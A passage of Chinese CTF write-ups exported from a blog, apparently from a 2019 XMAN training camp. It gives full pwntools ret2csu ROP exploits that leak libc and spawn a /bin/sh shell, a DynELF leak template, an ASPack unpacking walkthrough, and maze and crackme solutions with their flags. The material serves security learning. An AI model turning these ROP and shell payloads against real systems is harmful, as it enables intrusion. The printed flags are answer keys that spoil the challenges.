EDI（需要注意的是，虽然这里赋给的是EDI，但其实此时RDI的高 32 位寄存器值为 0（自行调试），所以其实我们可以控制 RDI 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。 也就是说只要我们控制argv[4], argv[5],argv[6]，就能分别控制RDX,RSI,RDI 此外，如果我们可以合理地控制R12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 RBX为 0，R12为存储我们想要调用的函数的地址。 控制RBX只需要argv[1]为0即可 在0x000000000040088D通过add rbx, 1 我们可以控制 RBX 与 RBP 的之间的关系为 RBX+1 = RBP，这样我们就不会执行loc_400896，进而可以继续执行下面的程序。 整个程序逻辑是这样的，main函数中，用户可以输入1024个字节，并通过echo函数将输入复制到自身栈空间，但该栈空间很小，使得栈溢出成为可能。由于复制过程中，以x00作为字符串终止符，故如果我们的payload中存在这个字符，则不会复制成功；但实际情况是，因为要用到上面提到的通用gadget来为write函数传参，故肯定会在payload中包含x00字符。 这个题目设置了这个障碍，也为这个障碍的绕过提供了其他条件。即由于echo函数的栈空间很小，与main函数栈中的输入字符串之间只间隔32字节，故我们可以利用这一点，只复制过去24字节数据加上一个包含连续4个pop指令的gadget地址，并借助这个gadget跳过原字符串的前32字节数据，我们就进入了main函数的栈，不受终止符的影响，即可进入我们正常的通用gadget调用过程 简单来说就是把之前main栈里的24个a和一个pppr弹出来，接着不就可以之后写个ret，继续构造ROP了 为什么是32个字节我们需要从系统的母函数和子函数的栈帧的分配看起 高地址 栈底 较早的栈帧 调用者的栈帧 （被调用者）当前栈帧 栈顶 低地址 在这个情景下，main函数即为调用者，echo函数即为被调用者，即为当前栈帧。我们深入两个栈帧之间 …… （main）调用者的栈帧 argv[n] （main）调用者的栈帧 …… （main）调用者的栈帧 argv[1] （main）调用者的栈帧 return address （main）调用者的栈帧 （栈帧底）被保存的EBP (echo)（被调用者）当前栈帧 被保存的寄存器、本地变量和临时变量 (echo)（被调用者）当前栈帧 参数构造区域 (echo)（被调用者）当前栈帧 当我们通过栈溢出覆盖掉echo的EBP地址栈底后，和上面main函数的栈还差一个return address的长度，我们知道在64位操作系统里面这个值即为8字节，而一个ASCII字母占用2个字节，故调用4次POP，把之前传入的A字母弹出4个，刚好为8个字节就跳到了main函数的参数地址 这里顺便介绍一下通过pattern.py计算64位下的栈溢出点的方法 首先还是一样的先创建出测试字符串 12syc@ubuntu:~/git/XMAN-2019-FZU/工具$ python pattern.py create 300 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9 老样子通过GDB调试复制粘贴输入 这里需要注意在64位的情况下，因为ret相当于pop rip指令，所以我们只要看一下栈顶的数值就能知道PC跳转的地址了。在GDB里，x是查看内存的指令，随后的gx代表数值用64位16进制显示 12gdb-peda$ x/gx $rsp0x7fffffffda48: 0x6241396141386141 随后我们就可以用pattern.py来计算溢出点 12syc@ubuntu:~/git/XMAN-2019-FZU/工具$ python pattern.py offset 0x6241396141386141hex pattern decoded as: Aa8Aa9Ab24 和我们看代码分析得到的溢出点一致即为24个字节 则payload1可以这样构造，首先 12payload1 = \"A\" * 16 + fakeebppayload1 += p64(pop4address) 使程序进入main函数的栈里面，然后就是我们正常的ROP构造过程 1payload1 += p64(pop6address) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) 这时完成的栈和寄存器的对照关系 argv[6] R15 1 argv[5] R14 write_got argv[4] R13 8 argv[3] R12 write_got argv[2] RBP 1 argv[1] RBX 0 然后的payload即为 1payload1 += p64(movcalladdress) 这时write参数构造完毕，对照关系表有 argv[6] 1 R15 EDI(RDI) argv[5] write_got R14 RSI argv[4] 8 R13 RDX 这两段代码运行后，会将栈顶指针移动56字节，我们在栈中布置56个字节即可,使程序返回开始地址，循环利用echo函数 12payload1 += \"A\" * 56 # 8 * 8 = 56payload1 += p64(startAddress) 之后收到完成延迟绑定后write函数的真实地址 1write_addr = u64(p.recv(8)) 即可计算出libc的基地址 1libc.address = write_addr-libc.symbols[\"write\"] 可得到system函数的真实地址 1system_addr = libc.symbols[\"system\"] payload2只需要执行system(&quot;/bin/sh&quot;)即可 1234payload2 = \"A\" * 16 + fakeebppayload2 += p64(pop4address)payload2 += p64(poprdi) + p64(libc.search(\"/bin/sh\\x00\").next()) payload2 += p64(system_addr) 最终的Exploit为 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#!/usr/bin/env pythonimport binasciifrom pwn import *from LibcSearcher import LibcSearcherelf = ELF('simple_stackoverflow3')libc = elf.libcp = process(\"./simple_stackoverlow3\")gdb.attach(p)write_plt = elf.symbols['write']write_got = elf.got['write']read_got = elf.got['read']main_addr = elf.symbols['main']bss_base = elf.bss()startAddress = 0x0000000000400630movcalladdress = 0x0000000000400880#mov rdx,r13,rsi,r14pop6address = 0x000000000040089A#pop rax,rbx,r12,r13,r14,r15pop4address = 0x000000000040089C#pop r12,r13,r14,r15poprdi = 0x00000000004008A3#pop rdifakeebp = 'b' * 8payload1 = \"A\" * 16 + fakeebppayload1 += p64(pop4address)payload1 += p64(pop6address) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1)payload1 += p64(movcalladdress)payload1 += \"A\" * 56 # 8 * 8 = 56payload1 += p64(startAddress)payload1 = payload1.ljust(1024, \"C\")p.recvuntil('Welcome \\n')print \"\\n#############sending payload1#############\\n\"p.send(payload1)sleep(1)write_addr = u64(p.recv(8))print \"write_addr: \" + hex(write_addr)libc.address = write_addr-libc.symbols[\"write\"]system_addr = libc.symbols[\"system\"]print \"system_addr: \" + hex(system_addr)offset = libc.symbols['write'] - libc.symbols['system']payload2 = \"A\" * 16 + fakeebppayload2 += p64(pop4address)payload2 += p64(poprdi) + p64(libc.search(\"/bin/sh\\x00\").next()) payload2 += p64(system_addr)p.recvuntil('Welcome \\n')print \"\\n#############sending payload2#############\\n\"p.send(payload2)p.interactive() 或者 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#!/usr/bin/env pythonimport binasciifrom pwn import *from LibcSearcher import LibcSearcherelf = ELF('simple_stackoverflow3')libc = elf.libcp = process(elf.path)gdb.attach(p)write_plt = elf.symbols['write']write_got = elf.got['write']read_got = elf.got['read']main_addr = elf.symbols['main']bss_base = elf.bss()startAddress = 0x0000000000400630movcalladdress = 0x0000000000400880#mov rdx,r13,rsi,r14pop6address = 0x000000000040089A#pop rax,rbx,r12,r13,r14,r15pop4address = 0x000000000040089C#pop r12,r13,r14,r15poprdi = 0x00000000004008A3#pop rdifakeebp = 'b' * 8payload1 = \"A\" * 16 + fakeebppayload1 += p64(pop4address)payload1 += p64(pop6address) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1)payload1 += p64(movcalladdress)payload1 += \"A\" * 56 # 8 * 8 = 56payload1 += p64(startAddress)payload1 = payload1.ljust(1024, \"C\")p.recvuntil('Welcome \\n')print \"\\n#############sending payload1#############\\n\"p.send(payload1)sleep(1)write_addr = u64(p.recv(8))print \"write_addr: \" + hex(write_addr)libc = LibcSearcher('write', write_addr)offset = libc.symbols['write'] - libc.symbols['system']system_addr = write_addr - (libc.dump('write')-libc.dump('system'))print \"system_addr: \" + hex(system_addr)sleep(1)payload2 = \"A\" * 16 + fakeebppayload2 += p64(pop4address)payload2 += p64(pop6address) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(bss_base) + p64(0)payload2 += p64(movcalladdress)payload2 += \"A\" * 56payload2 += p64(poprdi)payload2 += p64(bss_base)payload2 += p64(system_addr)payload2 = payload2.ljust(1024, \"C\")p.recvuntil('Welcome \\n')print \"\\n#############sending payload2#############\\n\"p.send(payload2)pause()p.send(\"/bin/sh\\x00\")p.interactive()","categories":[],"tags":[]},{"title":"XMAN-2019-福州-Re-baby_maze","slug":"XMAN-2019-╕ú╓▌-Re-baby-maze","date":"2019-08-08T16:16:45.000Z","updated":"2019-08-09T07:17:04.000Z","comments":true,"path":"2019/08/08/XMAN-2019-╕ú╓▌-Re-baby-maze/","link":"","permalink":"http://yoursite.com/2019/08/08/XMAN-2019-╕ú╓▌-Re-baby-maze/","excerpt":"","text":"天舒的师傅真的讲的不错，逻辑结构清晰，循序渐进，题目难易适中现在感觉其实逆向工程是很多东西的基础，比如要PWN一道题目，也需要清晰地认识到程序的流程，不只是PWN，现在Web也需要很多的逆向工程的知识。然后其实逆向工程和杂项和密码学结合还是挺深的，或者说逆向工程考的就是基本功，对编程能力和计算机原理的认识，所以我觉得逆向工程十分好玩 相关资料均可在GitHub上下载：https://github.com/suyucheng-lz/XMAN-2019-FZU baby_maze这题是一道和很基础的迷宫类型题目 迷宫问题有以下特点: 在内存中布置一张 “地图” 将用户输入限制在少数几个字符范围内. 一般只有一个迷宫入口和一个迷宫出口 布置的地图可以由可显字符 (比如#和*)组合而成 (这非常明显, 查看字符串基本就知道这是个迷宫题了.), 也可以单纯用不可显的十六进制值进行表示. 可以将地图直接组成一条非常长的字符串, 或是一行一行分开布置. 如果是一行一行分开布置的话, 因为迷宫一般都会比较大, 所以用于按行(注意, 布置并非按顺序布置, 每行都对应一个具体的行号, 你需要确定行号才能还原迷宫地图) 布置迷宫的函数会明显重复多次. 而被限制的字符通常会是一些方便记忆的组合 (不是也没办法), 比如w/s/a/d, h/j/k/l, l/r/u/d这样的类似组合. 当然各个键具体的操作需要经过分析判断 (像那种只用一条字符串表示迷宫的, 就可以用t键表示向右移动12个字符这样). 对于二维的地图, 一般作者都会设置一个X坐标和一个Y坐标用于保存当前位置. 我们也可以根据这个特点来入手分析. 一般情况下, 迷宫是只有 1 个入口和 1 个出口, 像入口在最左上角(0, 0)位置, 而出口在最右下角(max_X, max_Y)处. 但也有可能是出口在迷宫的正中心, 用一个Y字符表示等等. 解答迷宫题的条件也是需要根据具体情况判断的. 当然迷宫的走法可能不止 1 条, 也有情况是有多条走法, 但是要求某一个走法比如说代价最小. 那么这就可以变相为一个算法问题. 我们首先打开这个程序可以看一下IDA Pro自动生成的反汇编代码 12345678910111213141516int __cdecl main(int argc, const char **argv, const char **envp)&#123; char *v4; // [esp+1Ch] [ebp-4h] sub_401B60(); printf(\"input:\"); v4 = (char *)malloc(0x400u); if ( !v4 ) return -1; scanf(\"%s\", v4); if ( sub_401350(v4) &amp;&amp; sub_40145A() ) puts(\"Correct!\\nFlag is your input\"); else printf(\"wrong\"); return 0;&#125; 一开始我们毫无头绪，只是知道大概是需要分析sub_401350和sub_40145A两个函数 我们先来分析sub_401350这个函数 123456789101112131415161718192021222324252627282930int __cdecl sub_401350(char *a1)&#123; signed int i; // [esp+1Ch] [ebp-Ch] if ( strlen(a1) != 32 ) return 0; if ( strncmp(a1, \"flag&#123;\", 5u) || a1[31] != 125 ) return 0; for ( i = 0; i &lt;= 25; ++i ) &#123; switch ( a1[i + 5] ) &#123; case 97: dword_405060[i] = 0; break; case 100: dword_405060[i] = 1; break; case 119: dword_405060[i] = 2; break; case 115: dword_405060[i] = 3; break; default: return 0; &#125; &#125; return 1;&#125; 我们不难分析出a1其实即为我们输入的flag，且flag的长度为32，然后一个for循环里面的switch语句，相当于我们输入的flag转换数据并存在dword_405060这个数组里面 然后我们看看switch函数的几个值，97，100，119，115是不是很像ASCII编码，我们把它通过IDA转换为char类型，然后重命名一些函数名称就成了下面的样子 123456789101112131415161718192021222324252627282930int __cdecl sub_401350(char *flag)&#123; signed int i; // [esp+1Ch] [ebp-Ch] if ( strlen(flag) != 32 ) return 0; if ( strncmp(flag, \"flag&#123;\", 5) || flag[31] != 125 ) return 0; for ( i = 0; i &lt;= 25; ++i ) &#123; switch ( flag[i + 5] ) &#123; case 'a': save[i] = 0; break; case 'd': save[i] = 1; break; case 'w': save[i] = 2; break; case 's': save[i] = 3; break; default: return 0; &#125; &#125; return 1;&#125; 就直观很多了，等于说我们的flag仅限于a, d, w, s这四个字母，这就很像一道迷宫题的样子，我们继续分析sub_40145A这个函数 123456789101112131415161718192021signed int sub_40145A()&#123; signed int i; // [esp+4h] [ebp-Ch] signed int v2; // [esp+8h] [ebp-8h] signed int v3; // [esp+Ch] [ebp-4h] v3 = 4; v2 = 5; for ( i = 0; i &lt;= 25; ++i ) &#123; v3 += dword_402068[save[i]]; v2 += dword_402078[save[i]]; if ( v3 &gt; 9 || v3 &lt; 0 || v2 &gt; 9 || v2 &lt; 0 ) return 0; if ( byte_402000[10 * v3 + v2] == 35 ) return 0; if ( byte_402000[10 * v3 + v2] == 43 ) return 1; &#125; return 0;&#125; 我们先分析一下dword_402068和dword_402078这两个数组 1234567891011.data:00402068 ; int dword_402068[].data:00402068 dword_402068 dd 0 ; DATA XREF: sub_40145A+2A↑r.data:0040206C align 10h.data:00402070 db 0FFh.data:00402071 db 0FFh.data:00402072 db 0FFh.data:00402073 db 0FFh.data:00402074 db 1.data:00402075 db 0.data:00402076 db 0.data:00402077 db 0 这里有个坑，其他数据都是以db类型保存，而第一个为dd格式， db定义字节类型变量，一个字节数据占1个字节单元，读完一个，偏移量加1 dw定义字类型变量，一个字数据占2个字节单元，读完一个，偏移量加2 dd定义双字类型变量，一个双字数据占4个字节单元，读完一个，偏移量加4 在IDA里面我们可以通过D键更改数据的类型，可以变为这样 1234567891011121314151617data:00402068 ; int byte_402068[].data:00402068 byte_402068 db 0 ; DATA XREF: sub_40145A+2A↑r.data:00402069 db 0.data:0040206A db 0.data:0040206B db 0.data:0040206C db 0.data:0040206D db 0.data:0040206E db 0.data:0040206F db 0.data:00402070 db 0FFh.data:00402071 db 0FFh.data:00402072 db 0FFh.data:00402073 db 0FFh.data:00402074 db 1.data:00402075 db 0.data:00402076 db 0.data:00402077 db 0 不难看出其实保存的数据就是十六进制下的0，0，-1，1，之前的align就是为了对齐内存数据，从内存数据也可以看出 1200402060 2E 2E 23 23 00 00 00 00 00 00 00 00 00 00 00 0000402070 FF FF FF FF 01 00 00 00 FF FF FF FF 01 00 00 00 dword_402068的内存地址位0x00402068到0x00402077，即为 100 00 00 00 00 00 00 00 FF FF FF FF 01 00 00 00 现在我们来关注dword_402078这个数组 12345678910111213141516171819202122232425262728293031323334353637data:00402078 dword_402078 dd 0FFFFFFFFh ; DATA XREF: sub_40145A+3E↑r.data:0040207C db 1.data:0040207D db 0.data:0040207E db 0.data:0040207F db 0.data:00402080 db 0.data:00402081 db 0.data:00402082 db 0.data:00402083 db 0.data:00402084 db 0.data:00402085 db 0.data:00402086 db 0.data:00402087 db 0.data:00402088 db 0.data:00402089 db 0.data:0040208A db 0.data:0040208B db 0.data:0040208C db 0.data:0040208D db 0.data:0040208E db 0.data:0040208F db 0.data:00402090 db 0.data:00402091 db 0.data:00402092 db 0.data:00402093 db 0.data:00402094 db 0.data:00402095 db 0.data:00402096 db 0.data:00402097 db 0.data:00402098 db 0.data:00402099 db 0.data:0040209A db 0.data:0040209B db 0.data:0040209C db 0.data:0040209D db 0.data:0040209E db 0.data:0040209F db 0 在IDA里面我们可以选中需要导出数据的内存区域，然后按shift+E的快捷键就可以选择各种导出格式方便导出，我们直接选择导出为数组 1234567unsigned char ida_chars[] =&#123; 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00&#125;; 这两个数组也就是改变v3和v2的值，也不太能方便的得知程序的真实意图，我们再看看byte_402000 12345.data:00402000 byte_402000 db 23h ; DATA XREF: sub_40145A+7A↑r.data:00402000 ; sub_40145A+9F↑r.data:00402001 db '#....######.##.###.##.##.###....##.###..####......####.#.##.####.'.data:00402001 db '..##....#########.###+#####.....##',0.data:00402065 align 4 这就是迷宫的地图啊，然后这里有个坑，其实第一个23h也是地图的一部分，也就是#，我们不难得出地图的字符串 1#....######.##.###.##.##.###....##.###..####......####.#.##.####...##....#########.###+#####.....## 所以这是个怎么样的二维地图呢，我们回到函数看到这些代码 123456if ( v3 &gt; 9 || v3 &lt; 0 || v2 &gt; 9 || v2 &lt; 0 ) return 0; if ( byte_402000[10 * v3 + v2] == 35 ) return 0; if ( byte_402000[10 * v3 + v2] == 43 ) return 1; [10 * v3 + v2]就是一个模拟二维数组的方式，根据v3 &gt; 9 || v3 &lt; 0 || v2 &gt; 9 || v2 &lt; 0也可以得出这是一个按照10 x 10 排列的地图 12345678910##....######.##.###.##.##.###....##.###..####......####.#.##.####...##....#########.###+#####.....## v3就是行数，v2就是列数,v3和v2的初始值就是起点，然后根据 12if ( byte_402000[10 * v3 + v2] == 43 ) return 1; 不难得出终点就是+，起点就是二维数组的[4,5]，也就是第五行第六列，我们用其他符号标出起点 12345678910##....######.##.###.##.##.###....##.###..####0.....####.#.##.####...##....#########.###+#####.....## 则函数的修复代码应该为 123456789101112131415161718192021signed int sub_40145A()&#123; signed int i; // [esp+4h] [ebp-Ch] signed int line; // [esp+8h] [ebp-8h] signed int row; // [esp+Ch] [ebp-4h] row = 4; line = 5; for ( i = 0; i &lt;= 25; ++i ) &#123; row += s1[save[i]]; line += s2[save[i]]; if ( row &gt; 9 || row &lt; 0 || line &gt; 9 || line &lt; 0 ) return 0; if ( map[10 * row + line] == 35 ) return 0; if ( map[10 * row + line] == 43 ) return 1; &#125; return 0;&#125; 不难得出flag，即为以a, w, s, d为方向键走出迷宫的路径 flag{wwwwaaaasssaassssdddssddddw}","categories":[],"tags":[]},{"title":"XMAN-2019-福州-Re-reverse2_final","slug":"XMAN-2019-╕ú╓▌-Re-reverse2-final","date":"2019-08-08T16:15:24.000Z","updated":"2019-08-09T07:15:44.000Z","comments":true,"path":"2019/08/08/XMAN-2019-╕ú╓▌-Re-reverse2-final/","link":"","permalink":"http://yoursite.com/2019/08/08/XMAN-2019-╕ú╓▌-Re-reverse2-final/","excerpt":"","text":"终于学会如何手动脱ASPack类型的壳了。“壳”就是专门压缩或加密的工具，通过在压缩、加密的过程中加入保护性代码，程序文件会失去原来的程序结构，改变代码的表。现形式，增加被篡改和反编译的难度，达到保护程序内部逻辑的效果。 壳主要有压缩壳和加密壳两种 压缩壳 以减小软件体积和改变软件可执行代码的特征为目的压缩壳的主要目的对程序进行压缩，对程序的保护不是该类壳的重点。主要有ASPack、UPX和PECompact等。此题即为ASPack类型的壳。 加密壳 以保护软件为目的，根据用户输入的密码用相应的加密算法对原程序进行加密。主要有ASProtect、Armadillo、EXECryptor以及Themida等。 由于近年来CTF比赛中带壳的逆向题出现频率稍有增加，在静态分析之前，进行查壳是非常有必要的，常用的工具有PEID等，进行查壳后，如果是简单且常见的壳如UPX等，那么直接可以使用工具完成脱壳，如果一时半会找不到可用的工具，也可以尝试手工脱壳，例如ASPack就能够采用ESP定律来脱除。如果是侧重考察脱壳的题，一般程序本身就比较简单了，可以这样说，这类题如果能成功脱壳，基本上也算是做出来了。 相关资料均可在GitHub上下载：https://github.com/suyucheng-lz/XMAN-2019-FZU 脱壳首先我们尝试用IDA Pro直接打开这个可执行文件 IDA Pro只出现了start函数，且可以发现出现了很多奇怪的数据可以考虑是不是一个带壳的文件，我们使用工具PEID不难查出这就是一个ASPack类型的壳 然后我们把程序拖进OllyDbg进行动态调试 可以看到很明显的加壳代码逻辑pushad指令将当前所有寄存器的数据压入栈中，保存现场，当壳程序执行完毕后恢复主程序，这里涉及到一个ESP定律 ESP定律——栈平衡原理 ▉ 加壳软件，必须保证外壳初始化的现场环境(寄存器)与原程序的现场环境相同 ▉ 加壳程序初始化时保存各寄存器的值，外壳执行完毕，再恢复各寄存器内容，最后再跳到原程序执行 ▉ 程序通常使用 pushad/popad、pushfd/popfd 指令来保存与恢复现场环境 所以我们只需要按下F7查看右边寄存器窗口ESP的值，选中右键数据窗口中跟随然后进行下硬件断点 然后在按下F9运行程序，程序会在断点处停下就会看到 上面有JNZ意思是不等于0就跳转，还看到PUSH 意思是压入一个地址然后在RETN返回，因为是停在JNZ上箭头显示为红色(红色代表跳转已经实现) ，就直接F7直到跳到正确的入口地址 至此已找到主函数的入口，OEP也已经找到。在执行到原程序入口点后，外壳程序已经将原程序的各个段以及导入表等数据都恢复完成。为了能够调试分析程序，我们需要使用内存dump工具，把程序导出 这里我们直接获取EIP作为OEP即可，我们也需要注意记住OEP的值1B98在接下来的恢复导入表的时候有用。现在我们来恢复导入表，首先我们启动原程序，让Imp Rec工具抓取到它的进程 现在我们要做的就是，输入我们之前获得的OEP，然后执行自动查找IAT和获取输入表，然后转储到文件，文件即为我们之前dump出的主程序 到这里为止我们的所有脱壳项目已经完成，用IDA Pro打开我们的脱壳程序，可以发现导入表也已经调用成功，反汇编代码也比较正常了，我们可以很快的找到main函数 逆向发现我们输入的字符串被程序加密后与“DDCTF{reverseME}”作比较；也就是flag输入进去之后会被程序加密为“DDCTF{reverseME}”；将其拉入ida分析很明显，sub_401240函数便是加密函数；进入内部查看 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849int __usercall sub_401240@&lt;eax&gt;(const char *a1@&lt;esi&gt;, int a2)&#123; signed int v2; // edi signed int v3; // edx char v4; // bl char v5; // al char v6; // al unsigned int v7; // ecx char v9; // [esp+Bh] [ebp-405h] char v10; // [esp+Ch] [ebp-404h] char Dst; // [esp+Dh] [ebp-403h] v2 = strlen(a1); v10 = 0; memset(&amp;Dst, 0, 0x3FFu); v3 = 0; if ( v2 &gt; 0 ) &#123; v4 = v9; do &#123; v5 = a1[v3]; if ( (unsigned __int8)(a1[v3] - 48) &gt; 9u ) &#123; if ( (unsigned __int8)(v5 - 65) &lt;= 5u ) v9 = v5 - 55; &#125; else &#123; v9 = a1[v3] - 48; &#125; v6 = a1[v3 + 1]; if ( (unsigned __int8)(a1[v3 + 1] - 48) &gt; 9u ) &#123; if ( (unsigned __int8)(v6 - 65) &lt;= 5u ) v4 = v6 - 55; &#125; else &#123; v4 = a1[v3 + 1] - 48; &#125; v7 = (unsigned int)v3 &gt;&gt; 1; v3 += 2; *(&amp;v10 + v7) = v4 | 16 * v9; &#125; while ( v3 &lt; v2 ); &#125; return sub_401000(v2 / 2, a2);&#125; 可知程序为一个加密算法。将所输入的字符串的每个字符分别与0x402FF8相加，在此处所对应的字符即为加密后的新字符。写一个小脚本，如下： 1234567891011121314151617181920212223#include&lt;iostream&gt;using namespace std;int main()&#123; char a[]=\"1~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]1[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(\"; char b[16]; int i; char c[]=\"DDCTF&#123;reverseME&#125;\"; for(i=0;i&lt;16;i++) &#123; for(char n='!';n&lt;126;n++) &#123; b[i]=a[(int)n-31]; if(b[i]==c[i]) &#123; cout&lt;&lt;n; break; &#125; &#125; &#125; cout&lt;&lt;endl; return 0;&#125; 或者Python脚本 123456table = [00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFF,0x3A,0xFC,0x30,0x00,0xC5,0x03,0xCF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFE,0xFF,0xFF,0xFF,0x01,0x00,0x00,0x00,0x7E,0x7D,0x7C,0x7B,0x7A,0x79,0x78,0x77,0x76,0x75,0x74,0x73,0x72,0x71,0x70,0x6F,0x6E,0x6D,0x6C,0x6B,0x6A,0x69,0x68,0x67,0x66,0x65,0x64,0x63,0x62,0x61,0x60,0x5F,0x5E,0x5D,0x5C,0x5B,0x5A,0x59,0x58,0x57,0x56,0x55,0x54,0x53,0x52,0x51,0x50,0x4F,0x4E,0x4D,0x4C,0x4B,0x4A,0x49,0x48,0x47,0x46,0x45,0x44,0x43,0x42,0x41,0x40,0x3F,0x3E,0x3D,0x3C,0x3B,0x3A,0x39,0x38,0x37,0x36,0x35,0x34,0x33,0x32,0x31,0x30,0x2F,0x2E,0x2D,0x2C,0x2B,0x2A,0x29,0x28,0x27,0x26,0x25,0x24,0x23,0x22,0x21,0x20,0x00,0x01,0x00,0x00,0x00,0x70,0x19,0x38,0x00,0x80,0x12,0x38,0x00,0x00,0x00,0x00,0x00]flag = ''str1 = \"DDCTF&#123;reverseME&#125;\"for i in range(len(str1)): flag += chr(table.index(ord(str1[i])))print(flag)","categories":[],"tags":[]},{"title":"借助DynELF实现无libc的漏洞利用小结","slug":"╜Φ╓·DynELF╩╡╧╓╬▐libc╡─┬⌐╢┤└√╙├╨í╜ß","date":"2019-08-06T14:46:47.000Z","updated":"2019-08-07T05:47:28.000Z","comments":true,"path":"2019/08/06/╜Φ╓·DynELF╩╡╧╓╬▐libc╡─┬⌐╢┤└√╙├╨í╜ß/","link":"","permalink":"http://yoursite.com/2019/08/06/╜Φ╓·DynELF╩╡╧╓╬▐libc╡─┬⌐╢┤└√╙├╨í╜ß/","excerpt":"","text":"前言 在没有目标系统libc文件的情况下，我们可以使用pwntools的DynELF模块来泄漏地址信息，从而获取到shell。本文针对linux下的puts和write，分别给出了实现DynELF关键函数leak的方法，并通过3道CTF题目介绍了这些方法的具体应用情况。 DynELF DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块，其基本代码框架如下。 1234567891011p = process('./xxx')def leak(address): #各种预处理 payload = \"xxxxxxxx\" + address + \"xxxxxxxx\" p.send(payload) #各种处理 data = p.recv(4) log.debug(\"%#x =&gt; %s\" % (address, (data or '').encode('hex'))) return datad = DynELF(leak, elf=ELF(\"./xxx\")) #初始化DynELF模块 systemAddress = d.lookup('system', 'libc') #在libc文件中搜索system函数的地址 需要使用者进行的工作主要集中在leak函数的具体实现上，上面的代码只是个模板。其中，address就是leak函数要泄漏信息的所在地址，而payload就是触发目标程序泄漏address处信息的攻击代码。 使用条件 不管有没有libc文件，要想获得目标系统的system函数地址，首先都要求目标二进制程序中存在一个能够泄漏目标系统内存中libc空间内信息的漏洞。同时，由于我们是在对方内存中不断搜索地址信息，故我们需要这样的信息泄露漏洞能够被反复调用。以下是大致归纳的主要使用条件： 1）目标程序存在可以泄露libc空间信息的漏洞，如read@got就指向libc地址空间内； 2）目标程序中存在的信息泄露漏洞能够反复触发，从而可以不断泄露libc地址空间内的信息。 当然，以上仅仅是实现利用的基本条件，不同的目标程序和运行环境都会有一些坑需要绕过。接下来，我们主要针对write和puts这两个普遍用来泄漏信息的函数在实际配合DynELF工作时可能遇到的问题，给出相应的解决方法。 write函数 write函数原型是write(fd, addr, len)，即将addr作为起始地址，读取len字节的数据到文件流fd（0表示标准输入流stdin、1表示标准输出流stdout）。write函数的优点是可以读取任意长度的内存信息，即它的打印长度只受len参数控制，缺点是需要传递3个参数，特别是在x64环境下，可能会带来一些困扰。 在x64环境下，函数的参数是通过寄存器传递的，rdi对应第一个参数，rsi对应第二个参数，rdx对应第三个参数，往往凑不出类似“pop rdi; ret”、“pop rsi; ret”、“pop rdx; ret”等3个传参的gadget。此时，可以考虑使用libc_csu_init函数的通用gadget，具体原理请参见文章。简单的说，就是通过libc_csu_init函数的两段代码来实现3个参数的传递，这两段代码普遍存在于x64二进制程序中，只不过是间接地传递参数，而不像原来，是通过pop指令直接传递参数。 第一段代码如下： 1234567.text:000000000040075A pop rbx #需置为0，为配合第二段代码的call指令寻址.text:000000000040075B pop rbp #需置为1.text:000000000040075C pop r12 #需置为要调用的函数地址，注意是got地址而不是plt地址，因为第二段代码中是call指令.text:000000000040075E pop r13 #write函数的第三个参数.text:0000000000400760 pop r14 #write函数的第二个参数.text:0000000000400762 pop r15 #write函数的第一个参数.text:0000000000400764 retn 第二段代码如下： 1234.text:0000000000400740 mov rdx, r13.text:0000000000400743 mov rsi, r14.text:0000000000400746 mov edi, r15d.text:0000000000400749 call qword ptr [r12+rbx*8] 这两段代码运行后，会将栈顶指针移动56字节，我们在栈中布置56个字节即可。 这样，我们便解决了write函数在leak信息中存在的问题，具体的应用会放到后面的3道题目中讲。 puts函数 puts的原型是puts(addr)，即将addr作为起始地址输出字符串，直到遇到“x00”字符为止。也就是说，puts函数输出的数据长度是不受控的，只要我们输出的信息中包含x00截断符，输出就会终止，且会自动将“n”追加到输出字符串的末尾，这是puts函数的缺点，而优点就是需要的参数少，只有1个，无论在x32还是x64环境下，都容易调用。 为了克服输入不受控这一缺点，我们考虑利用puts函数输出的字符串最后一位为“n“这一特点，分两种情况来解决。 （1）puts输出完后就没有其他输出，在这种情况下的leak函数可以这么写。 12345678910111213141516171819202122def leak(address): count = 0 data = '' payload = xxx p.send(payload) print p.recvuntil('xxxn') #一定要在puts前释放完输出 up = \"\" while True: #由于接收完标志字符串结束的回车符后，就没有其他输出了，故先等待1秒钟，如果确实接收不到了，就说明输出结束了 #以便与不是标志字符串结束的回车符（0x0A）混淆，这也利用了recv函数的timeout参数，即当timeout结束后仍得不到输出，则直接返回空字符串”” c = p.recv(numb=1, timeout=1) count += 1 if up == 'n' and c == \"\": #接收到的上一个字符为回车符，而当前接收不到新字符，则 buf = buf[:-1] #删除puts函数输出的末尾回车符 buf += \"x00\" break else: buf 